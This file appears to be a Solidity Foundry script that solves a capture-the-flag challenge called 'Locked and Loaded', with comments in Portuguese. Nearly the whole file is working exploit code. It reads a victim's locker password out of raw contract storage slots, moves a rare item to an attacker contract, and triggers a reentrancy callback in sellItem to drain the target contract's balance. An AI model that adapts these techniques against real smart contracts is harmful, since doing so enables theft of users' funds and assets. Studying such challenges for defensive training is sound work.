// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/blockchain_locked_and_loaded/Lockers.sol";
import "../src/blockchain_locked_and_loaded/Setup.sol";
import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";


contract receiveItem {
  Lockers level;
  uint tries = 0;
  constructor(Lockers level_) {
    level = level_;
    level.getLocker("receiveItemContract", "password");
  }

  receive() external payable { //explora reentrancy
    if (tries == 0) {
      tries = 1;
      level.sellItem("WizardsScepter", "password");
    }
  } 
} 


contract LockersAndLoadedSolution is Script {
  Lockers public level = Lockers(payable(0x1317C8e0f6372eBF1D769d786fe412c59D60df48));
  Setup public level_setup = Setup(payable(0x4a120e4A194DAB110E66419c95Ec34B6dcE6fCdf));

  enum Rarity {
        Common,
        Rare,
        Epic,
        Mythic
  }

  function getItemSlot(uint256 _elementIndex) public pure returns (bytes32) {
        bytes32 startingSlotForArrayElements = keccak256(abi.encode(3));
        return bytes32(uint256(startingSlotForArrayElements) + (_elementIndex));
  }

  function listItens(uint numItens) public view {
    for (uint i = 0; i < numItens * 3; i++) { //Vimos que existe 10 itens 
        console.log(i % 3, ": ", vm.toString(vm.load(address(level), getItemSlot(i)))); //listando todos os itens, caçando o item de raridade mitica
    } 
        // nome do item mitico: WizardsScepter
  }

  function bytes32ToString(bytes32 _bytes32) public pure returns (string memory) {
    uint8 i = 0;
    while (i < 32 && _bytes32[i] != 0) {
        i++;
    }
    bytes memory bytesArray = new bytes(i);
    for (uint8 j = 0; j < i; j++) {
        bytesArray[j] = _bytes32[j];
    }
    return string(bytesArray);
  }

  function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_LOCKED_AND_LOADED"));
    //level.getLocker("teste", "teste");
    //listItens(10); // lista todos os itens com nome, owner_name e Rarity
    receiveItem receiveContract = new receiveItem(level); //cria o contrato de exploração
    (string memory owner, Lockers.Rarity rar) = level.viewItems("WizardsScepter"); //Pegando informações do item com base no seu nome
    console.log("Owner: ", owner);
    console.log("Rarity: ", uint(rar));
    bytes32 localPasswordSlot = keccak256(abi.encodePacked("beliefspace", uint256(0))); //se acessarmos esse slot ele nos retornará 0x50, que o tamanho da string, fazendo com que não seja possivel ter ela inteira nesse slot
    bytes32 password_data = vm.load(address(level), keccak256(abi.encodePacked(localPasswordSlot))); //pega parte da senha com baseno slot real
    bytes32 password_data2 = vm.load(address(level), bytes32(uint256(keccak256(abi.encodePacked(localPasswordSlot)))+1)); //pegando segunda parte da senha
    string memory password = bytes32ToString(password_data); //converte de bytes32 para string
    string memory password1 = bytes32ToString(password_data2); //converte de bytes32 para string
    string memory real_password = string(abi.encodePacked(password, password1)); //concatena as duas partes da senha
    console.log("beliefspace password: ", real_password);
    level.transferItem("WizardsScepter", "receiveItemContract", real_password); //transfere o item para a locker do meu contrato
    level.sellItem("WizardsScepter", "password"); //vende o item e explora o reentrancy
    console.log("Contract Balance: ", address(level).balance);
    // nome do item mitico: WizardsScepter
    // dono do item mitico: beliefspace
  }
} 
